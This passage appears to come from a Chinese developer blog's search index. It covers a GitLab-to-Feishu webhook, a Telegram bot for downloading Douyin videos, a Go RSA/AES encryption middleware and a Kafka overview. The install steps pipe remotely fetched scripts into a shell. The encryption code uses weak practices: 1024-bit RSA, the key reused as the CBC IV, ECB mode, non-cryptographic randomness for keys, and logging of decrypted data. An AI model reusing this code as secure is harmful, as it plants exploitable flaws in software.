bytes.NewBufferString(getMrContext(mc)))\n\tlog.Println(\"hookUrl\", hookUrl, getMrContext(mc), err)\n\tif err != nil {\n\t\tlog.Println(\"http err:\", err)\n\t\treturn\n\t}\n}\n\nfunc getMrContext(mc MrContext) string {\n\tstr := MRTemplate\n\tstr = strings.ReplaceAll(str, \"{{__project__}}\", mc.Project)\n\tstr = strings.ReplaceAll(str, \"{{__branch__}}\", mc.SourceBranch)\n\tstr = strings.ReplaceAll(str, \"{{__url__}}\", mc.Url)\n\tstr = strings.ReplaceAll(str, \"{{__name__}}\", mc.Name)\n\tstr = strings.ReplaceAll(str, \"{{__time__}}\", mc.Time)\n\tstr = strings.ReplaceAll(str, \"{{__title__}}\", strings.ReplaceAll(mc.Title, \"\\n\", \"\"))\n\tstr = strings.ReplaceAll(str, \"{{__desc__}}\", strings.ReplaceAll(mc.Desc, \"\\n\", \"\"))\n\treturn fmt.Sprintf(\"{\\\"msg_type\\\":\\\"interactive\\\",\\\"card\\\":%v}\", str)\n}\n\n```\n\n\n\n> main.go\n\n```go\npackage main\n\nimport (\n\t\"io/ioutil\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.Default()\n\tr.GET(\"/ping\", func(c *gin.Context) {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"pong\",\n\t\t})\n\t})\n\tr.POST(\"gitlab-hook\", GitlabHook)\n\tr.Run(\":8001\")\n}\n\nfunc GitlabHook(c *gin.Context) {\n\tif c.Request.Header.Get(\"X-Gitlab-Event\") != \"System Hook\" {\n\t\treturn\n\t}\n\n\turl := \"你的 web hook api 地址\"\n\tdata, _ := ioutil.ReadAll(c.Request.Body)\n\tExecHook(string(data), url)\n}\n```\n\n\n\n# 3. 配置模板\n\n可去飞书模板界面，拖拽想要的样式，然后保存复制出来json即可。\n\n```\nhttps://open.feishu.cn/tool/cardbuilder?from=custom_bot_doc\n```\n\n","tags":["gitlab"],"categories":["git"]},{"title":"抖音视频无水印下载之telegram robot","url":"%2Fp%2Fdaa6768a.html","content":"\n# 1. 注册机器人\n\n直接在Tg中与@BotFather对话即可创建bot,比较有趣的是在Tg很多的交互式体验都是通过类似对话的方式。\n\n将下面的链接的`{TOKEN}`替换成所获取的token然后浏览器访问\n\n```bash\nhttps://api.telegram.org/bot{TOKEN}/getUpdates\n```\n\n<!-- more -->\n\n返回数据，此时与机器人对话的内容均会在此显示出来\n\n```json\n{\nok: true,\nresult: [ ... ]\n}\n```\n\n\n\n# 2. 安装 tiktok解析\n\n注意：服务器要放在墙外。\n\n```bash\n\ngit clone https://github.com/Evil0ctal/Douyin_TikTok_Download_API\n\n# docker 部署\ncurl -fsSL get.docker.com -o get-docker.sh&&sh get-docker.sh &&systemctl enable docker&&systemctl start docker\ndocker compose up -d\n\n\n# 查看容器日志\ndocker logs -f douyin_tiktok_download_api\n\n\n# 删除容器\ndocker rm -f douyin_tiktok_download_api\n# 更新\ndocker compose pull && docker compose down && docker compose up -d\n```\n\n\n\n# 3. 安装 telegram bot\n\n### 3.1 安装\n\n```bash\ngit clone https://github.com/unix2dos/tikdo.git\ncd tikdo\nnpm install\n\n\n# 如果失败\nsudo apt-get remove nodejs\nsudo apt-get remove npm\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.2/install.sh | bash\nchmod +x ~/.nvm/nvm.sh\nsource ~/.bashrc \n\nnvm -v\nnvm install 14\n```\n\n\n\n### 3.2 修改配置文件\n\n```bash\ncp .env.example .env\nvi .env\n```\n\n\n\n```ini\nBOT_TOKEN=\"bot father 获取的 token\"\n#API_URL=\"https://api.douyin.wtf/api\"\nAPI_URL=\"http://0.0.0.0:8000/api\" \n\nPREFIX_VIDEO=video\nPREFIX_MUSIC=music\n```\n\n\n\n### 3.3 启动\n\n```bash\nsudo vi /usr/lib/systemd/system/tikdo.service\n```\n\n\n\n```bash\n[Unit]\nDescription=tikdo service\n \n[Service]\nUser=root\nWorkingDirectory=/root/tikdo\nExecStart=/root/.nvm/versions/node/v14.21.1/bin/node app.js\nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n\n\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable tikdo\nsudo systemctl restart tikdo\n```\n\n\n\n\n\n# 4. 参考资料\n\n+ https://github.com/fikiismyname/tikdo\n+  https://github.com/Evil0ctal/Douyin_TikTok_Download_API\n+  https://blog.fanfq.com/dev/Telegram_bot_dev_thinking.html\n\n","tags":["telegram"],"categories":["使用软件"]},{"title":"golang数据传输加密解密","url":"%2Fp%2F8ba026f1.html","content":"\n在前后端数据传输的过程中, 如果没有对数据加密, 抓包软件直接能看到我请求发的是什么数据，服务端给我返回的数据是什么。\n\n并且可以用抓包软件修改响应数据返回给客户端，这样一来，客户端实际上接收到的数据并不是服务端给我的源数据，而是被第三者修改过的数据，如此一来，数据传输的安全就很有必要了。\n\n<!-- more -->\n\n解决方案可以用对称加密加密数据, 非对称加密加密key,   以客户端给服务端传输数据为例:\n\n1. 服务端生成一对RSA秘钥，私钥放在服务端（不可泄露），公钥下发给客户端。\n2. 客户端使用随机函数生成 key。\n3. 客户端使用随机的 key 对传输的数据用AES进行加密。\n4. 使用服务端给的公钥对 key进行加密。\n5. 客户端将使用AES加密的数据  以及使用 RSA公钥加密的key  一起发给服务端。\n6. 服务端拿到数据后，先使用私钥对加密的随机key进行解密，解密成功即可确定是客户端发来的数据，没有经过他人修改，然后使用解密成功的随机key对使用AES加密的数据进行解密，获取最终的数据。\n\n这是单向的加密认证, 如果要实现双向加密验证, 就要生成两对公钥和私钥。\n\n\n\n# 1. 步骤\n\n### 1.1 生成rsa密钥对\n\n生成私钥\n\n```bash\nopenssl genrsa -out private_client.pem 1024\nopenssl genrsa -out private_server.pem 1024\n```\n\n生成公钥\n\n```bash\nopenssl rsa -in private_client.pem -pubout -out public_client.pem\nopenssl rsa -in private_server.pem -pubout -out public_server.pem\n```\n\n\n\n### 1.2 加解密代码\n\n+ rsa.go 非对称加密\n\n```go\npackage encrypt\n\nimport (\n\t\"crypto/rand\"\n\t\"crypto/rsa\"\n\t\"crypto/sha256\"\n\t\"crypto/x509\"\n\t\"encoding/pem\"\n\t\"errors\"\n)\n\n// BytesToPrivateKey bytes to private key\nfunc BytesToPrivateKey(priv []byte) (*rsa.PrivateKey, error) {\n\tblock, _ := pem.Decode(priv)\n\tenc := x509.IsEncryptedPEMBlock(block)\n\tb := block.Bytes\n\tvar err error\n\tif enc {\n\t\tb, err = x509.DecryptPEMBlock(block, nil)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n\tkey, err := x509.ParsePKCS1PrivateKey(b)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn key, nil\n}\n\n// BytesToPublicKey bytes to public key\nfunc BytesToPublicKey(pub []byte) (*rsa.PublicKey, error) {\n\tblock, _ := pem.Decode(pub)\n\tenc := x509.IsEncryptedPEMBlock(block)\n\tb := block.Bytes\n\tvar err error\n\tif enc {\n\t\tb, err = x509.DecryptPEMBlock(block, nil)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n\tifc, err := x509.ParsePKIXPublicKey(b)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tkey, ok := ifc.(*rsa.PublicKey)\n\tif !ok {\n\t\treturn nil, errors.New(\"not ok\")\n\t}\n\treturn key, nil\n}\n\n// EncryptWithPublicKey encrypts data with public key\nfunc EncryptWithPublicKey(msg []byte, pub *rsa.PublicKey) ([]byte, error) {\n\thash := sha256.New()\n\tciphertext, err := rsa.EncryptOAEP(hash, rand.Reader, pub, msg, nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn ciphertext, nil\n}\n\n// DecryptWithPrivateKey decrypts data with private key\nfunc DecryptWithPrivateKey(ciphertext []byte, priv *rsa.PrivateKey) ([]byte, error) {\n\thash := sha256.New()\n\tplaintext, err := rsa.DecryptOAEP(hash, rand.Reader, priv, ciphertext, nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn plaintext, nil\n}\n```\n\n+ aes.go 对称加密\n\n  ```go\n  package encrypt\n  \n  import (\n  \t\"bytes\"\n  \t\"crypto/aes\"\n  \t\"crypto/cipher\"\n  )\n  \n  // =================== CBC ======================\n  func AesEncryptCBC(origData []byte, key []byte) (encrypted []byte) {\n  \t// 分组秘钥\n  \t// NewCipher该函数限制了输入k的长度必须为16, 24或者32\n  \tblock, _ := aes.NewCipher(key)\n  \tblockSize := block.BlockSize()                              // 获取秘钥块的长度\n  \torigData = pkcs5Padding(origData, blockSize)                // 补全码\n  \tblockMode := cipher.NewCBCEncrypter(block, key[:blockSize]) // 加密模式\n  \tencrypted = make([]byte, len(origData))                     // 创建数组\n  \tblockMode.CryptBlocks(encrypted, origData)                  // 加密\n  \treturn encrypted\n  }\n  func AesDecryptCBC(encrypted []byte, key []byte) (decrypted []byte) {\n  \tblock, _ := aes.NewCipher(key)                              // 分组秘钥\n  \tblockSize := block.BlockSize()                              // 获取秘钥块的长度\n  \tblockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) // 加密模式\n  \tdecrypted = make([]byte, len(encrypted))                    // 创建数组\n  \tblockMode.CryptBlocks(decrypted, encrypted)                 // 解密\n  \tdecrypted = pkcs5UnPadding(decrypted)                       // 去除补全码\n  \treturn decrypted\n  }\n  func pkcs5Padding(ciphertext []byte, blockSize int) []byte {\n  \tpadding := blockSize - len(ciphertext)%blockSize\n  \tpadtext := bytes.Repeat([]byte{byte(padding)}, padding)\n  \treturn append(ciphertext, padtext...)\n  }\n  func pkcs5UnPadding(origData []byte) []byte {\n  \tlength := len(origData)\n  \tunpadding := int(origData[length-1])\n  \treturn origData[:(length - unpadding)]\n  }\n  \n  // =================== ECB ======================\n  func AesEncryptECB(origData []byte, key []byte) (encrypted []byte) {\n  \tnewCipher, _ := aes.NewCipher(generateKey(key))\n  \tlength := (len(origData) + aes.BlockSize) / aes.BlockSize\n  \tplain := make([]byte, length*aes.BlockSize)\n  \tcopy(plain, origData)\n  \tpad := byte(len(plain) - len(origData))\n  \tfor i := len(origData); i < len(plain); i++ {\n  \t\tplain[i] = pad\n  \t}\n  \tencrypted = make([]byte, len(plain))\n  \t// 分组分块加密\n  \tfor bs, be := 0, newCipher.BlockSize(); bs <= len(origData); bs, be = bs+newCipher.BlockSize(), be+newCipher.BlockSize() {\n  \t\tnewCipher.Encrypt(encrypted[bs:be], plain[bs:be])\n  \t}\n  \n  \treturn encrypted\n  }\n  func AesDecryptECB(encrypted []byte, key []byte) (decrypted []byte) {\n  \tnewCipher, _ := aes.NewCipher(generateKey(key))\n  \tdecrypted = make([]byte, len(encrypted))\n  \n  \tfor bs, be := 0, newCipher.BlockSize(); bs < len(encrypted); bs, be = bs+newCipher.BlockSize(), be+newCipher.BlockSize() {\n  \t\tnewCipher.Decrypt(decrypted[bs:be], encrypted[bs:be])\n  \t}\n  \n  \ttrim := 0\n  \tif len(decrypted) > 0 {\n  \t\ttrim = len(decrypted) - int(decrypted[len(decrypted)-1])\n  \t}\n  \n  \treturn decrypted[:trim]\n  }\n  func generateKey(key []byte) (genKey []byte) {\n  \tgenKey = make([]byte, 16)\n  \tcopy(genKey, key)\n  \tfor i := 16; i < len(key); {\n  \t\tfor j := 0; j < 16 && i < len(key); j, i = j+1, i+1 {\n  \t\t\tgenKey[j] ^= key[i]\n  \t\t}\n  \t}\n  \treturn genKey\n  }\n  ```\n\n  \n\n### 1.3 gin 中间件\n\n```go\npackage middlewares\n\nimport (\n\t\"bytes\"\n\t\"encoding/base64\"\n\t\"encoding/json\"\n\t\"io/ioutil\"\n\t\"math/rand\"\n\t\"net/http\"\n\t\"public/encrypt\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\ntype EncryptParam struct {\n\tKey           string `json:\"key\" form:\"key\"`\n\tEncryptedData string `json:\"encrypted_data\" form:\"encrypted_data\"`\n}\n\ntype EncryptResponseWriter struct {\n\tgin.ResponseWriter\n\tBuff *bytes.Buffer\n}\n\nfunc (e *EncryptResponseWriter) Write(p []byte) (int, error) {\n\treturn e.Buff.Write(p)\n\t//return e.ResponseWriter.Write(p) // 不再写底层的这个write\n}\n\nfunc Encrypt() gin.HandlerFunc {\n\treturn func(c *gin.Context) {\n\t\tencryptType := c.Request.Header.Get(\"bb-encrypt\")\n\t\tversion := c.Request.Header.Get(\"bb-encrypt-ver\")\n\t\tif encryptType == \"\" || encryptType == \"none\" {\n\t\t\treturn\n\t\t}\n\n\t\tencryptWriter := &EncryptResponseWriter{c.Writer, bytes.NewBuffer(make([]byte, 0))}\n\t\tc.Writer = encryptWriter\n\n\t\t// 解密请求\n\t\tif encryptType == \"request\" || encryptType == \"all\" {\n\n\t\t\tparam := EncryptParam{}\n\t\t\tif err := c.Bind(&param); err != nil {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Errorf(\"Bind EncryptParam err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tif param.Key == \"\" || param.EncryptedData == \"\" {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Error(\"EncryptedData is empty\")\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tcert, err := Dao.GetCert(version, \"server\")  // 此处是从数据库读取certs, 也可以本地读取文件\n\t\t\tif err != nil {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Errorf(\"GetCert err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tkey, err := RsaDecryptData(cert.PrivateKey, param.Key)\n\t\t\tif err != nil {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Errorf(\"RsaDecryptData err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tdata, err := AesDecryptData(key, param.EncryptedData)\n\t\t\tif err != nil {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Errorf(\"AesDecryptData err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tif c.Request.Method == http.MethodGet {\n\t\t\t\tc.Request.URL.RawQuery = data\n\t\t\t} else {\n\t\t\t\tc.Request.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(data)))\n\t\t\t}\n\n\t\t\tcommon.Log.Infof(\"%v-middlewares-decrypt raw: %v\", c.Request.URL.Path, data)\n\t\t}\n\n\t\tc.Next()\n\n\t\tnormalReturn := func() {\n\t\t\tif _, err := encryptWriter.ResponseWriter.Write(encryptWriter.Buff.Bytes()); err != nil {\n\t\t\t\tcommon.Log.Error(err.Error())\n\t\t\t}\n\t\t}\n\t\tif encryptWriter.Status() != http.StatusOK { // 不成功, 直接返回\n\t\t\tnormalReturn()\n\t\t\treturn\n\t\t}\n\n\t\tencryptWriter.Header().Set(\"bb-encrypted\", version)\n\t\tencryptWriter.Header().Set(\"bb-encrypt-ver\", \"0\")\n\t\t// 加密返回\n\t\tif encryptType == \"response\" || encryptType == \"all\" {\n\n\t\t\trandomKey := RandStringRunes(16)\n\t\t\tcert, err := Dao.GetCert(version, \"client\") // 此处是从数据库读取certs, 也可以本地读取文件\n\t\t\tif err != nil {\n\t\t\t\tcommon.Log.Errorf(\"GetCert err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tkey, err := RsaEncryptData(cert.PublicKey, randomKey)\n\t\t\tif err != nil {\n\t\t\t\tcommon.Log.Errorf(\"RsaEncryptData err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tencryptedData, err := AesEncryptData(randomKey, encryptWriter.Buff.String())\n\t\t\tif err != nil {\n\t\t\t\tcommon.Log.Errorf(\"AesEncryptData err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tdata, err := json.Marshal(EncryptParam{Key: key, EncryptedData: encryptedData})\n\t\t\tif err != nil {\n\t\t\t\tcommon.Log.Error(err.Error())\n\t\t\t} else {\n\t\t\t\tcommon.Log.Infof(\"%v-middlewares-encrypt raw: %v\", c.Request.URL.Path, encryptWriter.Buff.String())\n\t\t\t\tencryptWriter.Header().Set(\"bb-encrypt-ver\", \"1\")\n\t\t\t\tif _, err := encryptWriter.ResponseWriter.Write(data); err != nil {\n\t\t\t\t\tcommon.Log.Error(err.Error())\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\tnormalReturn()\n\t\t\treturn\n\t\t}\n\t}\n\n}\n\n// RSA加密\nfunc RsaEncryptData(publicKey, data string) (res string, err error) {\n\tpk, err := encrypt.BytesToPublicKey([]byte(publicKey))\n\tif err != nil {\n\t\treturn\n\t}\n\n\teData, err := encrypt.EncryptWithPublicKey([]byte(data), pk)\n\tif err != nil {\n\t\treturn\n\t}\n\n\tres = base64.StdEncoding.EncodeToString(eData)\n\treturn\n}\n\n// RSA解密\nfunc RsaDecryptData(privateKey, data string) (res string, err error) {\n\teData, err := base64.StdEncoding.DecodeString(data)\n\tif err != nil {\n\t\treturn\n\t}\n\n\tpk, err := encrypt.BytesToPrivateKey([]byte(privateKey))\n\tif err != nil {\n\t\treturn\n\t}\n\n\tcontext, err := encrypt.DecryptWithPrivateKey(eData, pk)\n\tif err != nil {\n\t\treturn\n\t}\n\tres = string(context)\n\treturn\n}\n\n// AES加密\nfunc AesEncryptData(key, data string) (res string, err error) {\n\teData := encrypt.AesEncryptECB([]byte(data), []byte(key))\n\tres = base64.URLEncoding.EncodeToString(eData)\n\treturn\n}\n\n// AES解密\nfunc AesDecryptData(key, data string) (res string, err error) {\n\teData, err := base64.URLEncoding.DecodeString(data)\n\tif err != nil {\n\t\treturn\n\t}\n\tcontext := encrypt.AesDecryptECB(eData, []byte(key))\n\tres = string(context)\n\treturn\n}\n\nvar letterRunes = []rune(\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\")\n\n// 随机字符串\nfunc RandStringRunes(n int) string {\n\tb := make([]rune, n)\n\tfor i := range b {\n\t\tb[i] = letterRunes[rand.Intn(len(letterRunes))]\n\t}\n\treturn string(b)\n}\n```\n\n\n\n# 2. 参考资料\n\n+ https://blog.csdn.net/yuzhiqiang_1993/article/details/88641265\n+ https://www.cnblogs.com/yjf512/p/10570922.html\n+ https://blog.csdn.net/mirage003/article/details/87868999","tags":["encrypt"],"categories":["4_golang实战"]},{"title":"kafka原理和高可用","url":"%2Fp%2F6349fed0.html","content":"\n# 1. Kafka介绍\n\nKafka是LinkedIn开发并开源的一套分布式的高性能消息引擎服务，Kafka在大数据领域扮演者举足轻重的角色。\n\n- 消息系统：Kafka具备系统解耦、冗余存储、流量削峰、缓冲、异步通信、扩展性、可恢复性等强大的功能。\n- 存储系统：Kafka 的消息持久化功能和多副本机制，我们可以把Kafka作为长期的数据存储系统来使用。\n- 流式处理平台：Kafka还提供了一个完整的流式处理类库，比如窗口、连接、变换和聚合等各类操作，也是一个分布式流处理平台。\n\n<!-- more -->\n\n### 1.1 基础架构\n\n![img](kafka原理和高可用/8d4b4a03-ddd9-4979-aa4c-86134bae4d96.png)\n\nKafka 将消息以 topic 为单位进行归纳，发布消息的程序称为 Producer，消费消息的程序称为 Consumer。它是以集群的方式运行，可以由一个或多个服务组成，每个服务叫做一个 Broker。 \n\n### 1.2 组件\n\n- Producer：生产者，负责将消息发送到 Broker\n- Consumer ：消费者，从 Broker 接收消息\n- Consumer Group ：消费者组，由多个 Consumer 组成。消费者组内每个消费者负责消费不同分区的数据，一个分区只能由一个组内消费者消费，消费者组之间互不影响。所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者。\n- Broker ：可以看做一个独立的 Kafka 服务节点或 Kafka 服务实例。如果一台服务器上只部署了一个 Kafka 实例，那么我们也可以将 Broker 看做一台 Kafka 服务器。\n- Topic ：一个逻辑上的概念，包含很多 Partition，同一个 Topic 下的 Partiton 的消息内容是不相同的。\n- Partition ：为了实现扩展性，一个非常大的 topic 可以分布到多个 broker 上，一个 topic 可以分为多个 partition，每个 partition 是一个有序的队列。\n- Replica ：副本，同一分区的不同副本保存的是相同的消息，为保证集群中的某个节点发生故障时，该节点上的 partition 数据不丢失，且 kafka 仍然能够继续工作，- kafka 提供了副本机制，一个 topic 的每个分区都有若干个副本，一个 leader 和若干个 follower。\n- Leader ：每个分区的多个副本中的\"主副本\"，生产者以及消费者只与 Leader 交互。\n- Follower ：每个分区的多个副本中的\"从副本\"，负责实时从 Leader 中同步数据，保持和 Leader 数据的同步。Leader 发生故障时，从 Follower 副本中重新选举新的 Leader 副本对外提供服务。\n\n### 1.3 主题和分区\n\nKafka 还有一个概念叫 Partition（分区），分区具体在服务器上面表现起初就是一个目录。一个主题下面有多个分区，这些分区会存储到不同的服务器上面，或者说，其实就是在不同的主机上建了不同的目录。\n\n![640?wx_fmt=png](kafka原理和高可用/jrifphk4m1.png)\n\nTopic 和 Partition Topic 也是逻辑概念，而 Partition 就是分布式存储单元。\n\n人们把一个主题的数据看成一个流，不管它有多少个分区。 一般情况下，一个消息会被发布到一个特定的主题上。生产者在默认情况下把消息均衡地分布到主题的所有分区上，而并不关心特定消息会被写到哪个分区。\n\n不过，在某些情况下，生产者会把消息直接写到指定的分区。这通常是通过消息键和分区器来实现的，分区器为键生成一个散列值，并将其映射到指定的分区上。这样可以保证包含同一个键的消息会被写到同一个分区上。 \n\n\n\n### 1.4 分区的副本\n\nKafka 中的 Partition 为了保证数据安全，所以每个 Partition 可以设置多个副本。此时我们对分区 0，1，2 分别设置 3 个副本（其实设置两个副本是比较合适的）：\n\n![640?wx_fmt=png](kafka原理和高可用/zc4cj0f9pa.png)\n\n而且其实每个副本都是有角色之分的，它们会选取一个副本作为 Leader，而其余的作为 Follower。\n\n我们的生产者在发送数据的时候，是直接发送到 Leader Partition 里面，然后 Follower Partition 会去 Leader 那里自行同步数据，消费者消费数据的时候，也是从 Leader 那去消费数据的。\n\n![640?wx_fmt=png](kafka原理和高可用/o58y1o4bi3.png)\n\n\n\n##### 1. ISR\n\n<img src=\"kafka原理和高可用/image-20230907121322032.png\" alt=\"image-20230907121322032\" style=\"zoom:50%;\" />\n\n- AR:分区中的所有 Replica 统称为 AR\n- ISR:所有与 Leader 副本保持一定程度同步的Replica(包括 Leader 副本在内)组成 ISR\n- OSR:与 Leader 副本同步滞后过多的 Replica 组成了 OSR\n\nLeader 负责维护和跟踪 ISR 集合中所有 Follower 副本的滞后状态，当 Follower 副本落后过多时，就会将其放入 OSR 集合，当 Follower 副本追上了 Leader 的进度时，就会将其放入 ISR 集合。\n\n默认情况下，只有 ISR 中的副本才有资格晋升为 Leader（不过这个原则也可以通过修改相应的参数配置来改变）\n\n##### 2. HW\n\n ISR与HW和LEO也有紧密的关系。HW是High Watermark的缩写，俗称高水位，它标识了一个特定的消息偏移量（offset），消费者只能拉取到这个offset之前的消息。 \n\nLEO是Log End Offset的缩写，它标识当前日志文件中下一条待写入消息的offset，LEO的大小相当于当前日志分区中最后一条消息的offset值加1。\n\n分区ISR集合中的每个副本都会维护自身的LEO，而ISR集合中最小的LEO即为分区的HW，对消费者而言只能消费HW之前的消息。 \n\n### 1.5 生产者\n\n##### 1. ACK 机制\n\nKafka的Producer有三种ack机制，参数值有0、1 和 ALL\n\n+ 0： 相当于异步操作，Producer 不需要Leader给予回复，发送完就认为成功，继续发送下一条（批）Message。此机制具有最低延迟，但是持久性可靠性也最差，当服务器发生故障时，很可能发生数据丢失。\n+ 1： Kafka 默认的设置。表示 Producer 要 Leader 确认已成功接收数据才发送下一条（批）Message。不过 Leader 宕机，Follower 尚未复制的情况下，数据就会丢失。此机制提供了较好的持久性和较低的延迟性。\n+ ALL： Leader 接收到消息之后，还必须要求ISR列表里跟Leader保持同步的那些Follower都确认消息已同步，Producer 才发送下一条（批）Message。此机制持久性可靠性最好，但延时性最差。\n\n不过，端到端延迟是指从消息生成到可供消费者读取的时间，这对3种配置来说都是一样的。这是因为为了保持一致性，在消息被写入所有同步副本之前，Kafka不允许消费者读取它们。 \n\n为了提升集群的数据持久性，可以将min.insync.replicas设置为2，确保至少有两个副本跟生产者保持“同步”。生产者需要配合将ack设置为all，这样就可以确保至少有两个副本（首领和另一个副本）确认写入成功，从而防止在以下情况下丢失数据。因为需要额外的开销，所以效率会有所降低。\n\n### 1.6 消费者\n\n消费者订阅一个或多个主题，并按照消息生成的顺序读取它们。消费者通过检查消息的偏移量来区分已经读取过的消息。偏移量是另一种元数据，它是一个不断递增的整数值，在创建消息时，Kafka会把它添加到消息里。\n\n在给定的分区里，每个消息的偏移量都是唯一的。消费者把每个分区最后读取的消息偏移量保存在Zookeeper或Kafka上，如果消费者关闭或重启，它的读取状态不会丢失。 \n\n##### 1. 消费者组\n\n消费者是消费者群组的一部分，也就是说，会有一个或多个消费者共同读取一个主题。群组保证每个分区只能被一个消费者使用。\n\n例如有3个消费者同时读取一个主题。其中的两个消费者各自读取一个分区，另外一个消费者读取其他两个分区。消费者与分区之间的映射通常被称为消费者对分区的所有权关系  \n\n-  一个主题的分区，只能被消费组内一个消费者消费。\n- 不同消费者组，可以消费同一个Topic，互不影响。\n\n##### 2. 再均衡\n\n消费者会向被指定为群组协调器的broker（不同消费者群组的协调器可能不同）发送心跳，如果消费者在足够长的一段时间内没有发送心跳，那么它的会话就将超时，群组协调器会认为它已经“死亡”，进而触发再均衡。\n\n session.timeout.ms指定了消费者可以在多长时间内不与服务器发生交互而仍然被认为还“活着”，默认是10秒。\n\n##### 3. 提交偏移量\n\n那么消费者是如何提交偏移量的呢？消费者会向一个叫作 __consumer_offset的主题发送消息，消息里包含每个分区的偏移量。 enable.auto.commit，你可以决定让消费者自动提交偏移量，也可以在代码里手动提交偏移量。\n\n如果触发再均衡，再均衡完成之后，每个消费者可能会被分配新的分区，而不是之前读取的那个。为了能够继续之前的工作，消费者需要读取每个分区最后一次提交的偏移量，然后从偏移量指定的位置继续读取消息。 \n\n假设我们使用默认的5秒提交时间间隔，并且消费者在最后一次提交偏移量之后3秒会发生崩溃。再均衡完成之后，接管分区的消费者将从最后一次提交的偏移量的位置开始读取消息。这个偏移量实际上落后了3秒，所以在这3秒内到达的消息会被重复处理。可以通过修改提交时间间隔来更频繁地提交偏移量，缩小可能导致重复消息的时间窗口，但无法完全避免。 \n\n\n\n### 1.7 Kafka 和 Zookeeper \n\nKafka 严重依赖于 Zookeeper 集群，Kafka用ZooKeeper来保存集群元数据和消费者信息。\n\n为了保证高可用，ZooKeeper以集群（被称为群组）的方式运行。由于使用了再均衡算法，建议一个ZooKeeper集群应该包含奇数个节点（比如3个、5个等）。\n\n2021年9月发布的Kafka 3.0包含了它的第一个生产版本，Kafka集群既可以使用基于ZooKeeper的传统控制器，也可以使用KRaft。 \n\n##### 1. broker\n\n Kafka使用ZooKeeper维护集群的成员信息。每个broker都有一个唯一的标识符，这个标识符既可以在配置文件中指定，也可以自动生成。broker在启动时通过创建ZooKeeper 临时节点把自己的ID注册到ZooKeeper中 。\n\n控制器其实也是一个broker，只不过除了提供一般的broker功能之外，它还负责选举分区首领。集群中第一个启动的broker会通过在ZooKeeper中创建一个名为 /controller的临时节点让自己成为控制器。\n\nKafka会使用ZooKeeper的临时节点来选举控制器，并会在broker加入或退出集群时通知控制器。控制器负责在broker加入或退出集群时进行首领选举。控制器会使用epoch来避免“脑裂”。\n\n##### 2. 偏移量\n\n随着时间的推移，Kafka对ZooKeeper的依赖在减少。在旧版本Kafka中，除了broker，消费者也利用ZooKeeper来保存消费者群组的信息和已消费的主题的信息，并定期提交分区的偏移量（为了实现消费者群组内的故障转移）。如果消费者使用ZooKeeper来保存偏移量，那么每一个消费者会在每一个提交时间间隔内执行一次ZooKeeper写入操作。合理的偏移量提交时间间隔是1分钟，因为如果有消费者发生故障，那么消费者群组将在这段时间内读取到重复消息。 \n\n不管怎样，还是建议使用新版的Kafka消费者，并将偏移量提交到Kafka，消除对ZooKeeper的依赖。 \n\n### 1.8 消息存储\n\n##### 1. 分区策略\n\n+ 轮询\n\n  如果键为null，并且使用了默认的分区器，那么记录将被随机发送给主题的分区。分区器使用轮询调度(round-robin)算法将消息均衡地分布到各个分区中。从Kafka 2.4开始，在处理键为null的记录时，默认分区器使用的轮询调度算法具备了黏性。\n\n+ key 指定分区\n\n  如果键不为空且使用了默认的分区器，那么Kafka会对键进行哈希（使用Kafka自己的哈希算法，即使升级Java版本，哈希值也不会发生变化），然后根据哈希值把消息映射到特定的分区。这里的关键在于同一个键总是被映射到同一个分区，\n\n+ 自定义策略\n\n  实现 Partitioner 接口就能自定义分区策略。\n\n+ 指定 Partiton 发送\n\n##### 2. 保留消息\n\n保留消息（在一定期限内）是Kafka的一个重要特性。Kafka broker默认的消息保留策略是这样的：要么保留一段时间（比如7天），要么保留到消息达到一定大小的字节数（比如1GB）。\n\nKafka通常根据配置的时间长短来决定数据可以被保留多久。我们使用log.retention.hours参数来配置时间，默认为168小时，也就是1周。 \n\n另一种数据保留策略是通过计算已保留的消息的字节总数来判断旧消息是否过期。这个字节总数阈值通过参数log.retention.bytes来指定，对应的是每一个分区。也就是说，如果一个主题包含8个分区，并且log.retention.bytes被设置为1 GB，那么这个主题最多可以保留8 GB的数据。 \n\n### 1.9 稀疏索引\n\nkafka 所面临的查询场景其实很简单：能按照 offset 或者 timestamp 查到消息即可。\n\n消息的 offset 完全可以设计成有序的（实际上是一个单调递增 long 类型的字段），这样消息在日志文件中本身就是有序存放的了。可以将消息划分成若干个 block，只索引每个 block 第一条消息的 offset 即可。\n\n当给定一个 offset 时，Kafka 采用的是二分查找来高效定位不大于 offset 